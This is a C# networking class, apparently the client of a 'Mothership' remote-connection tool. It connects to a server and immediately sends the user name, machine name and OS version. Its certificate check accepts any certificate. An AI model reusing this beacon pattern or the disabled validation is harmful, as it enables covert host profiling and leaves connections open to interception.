using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace LibMothership.Networking
{
    public class MothershipConnection
    {
        public string IP { get; private set; }
        public int Port { get; private set; }

        public event EventHandler<ServerConnectedEventArgs> ServerConnected;
        public event EventHandler<ServerDisconnectedEventArgs> ServerDisconnected;

        private TcpClient client;
        private StreamReader reader;
        private StreamWriter writer;

        public MothershipConnection(string ip, int port)
        {
            client = new TcpClient(ip, port);
            SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateCert));
            stream.AuthenticateAsClient("mothershipClient");
            reader = new StreamReader(stream);
            writer = new StreamWriter(stream);
            writer.AutoFlush = true;

            OnServerConnected();

            SendBanner();
        }

        public string Read()
        {
            return reader.ReadLine();
        }

        public void Send(string data)
        {
            writer.WriteLine(Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(data)));
        }

        public void SendBanner()
        {
            StringBuilder banner = new StringBuilder();
            banner.AppendLine(Environment.UserName);
            banner.AppendLine(Environment.MachineName);
            banner.Append(Environment.OSVersion);
            banner.Append(Environment.Version);

            Send(banner.ToString());
        }

        protected virtual void OnServerConnected()
        {
            var handler = ServerConnected;
            if (handler != null)
                handler(this, new ServerConnectedEventArgs(this));
        }

        protected virtual void OnServerDisconnected()
        {
            var handler = ServerDisconnected;
            if (handler != null)
                handler(this, new ServerDisconnectedEventArgs(this));
        }

        public static bool ValidateCert(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
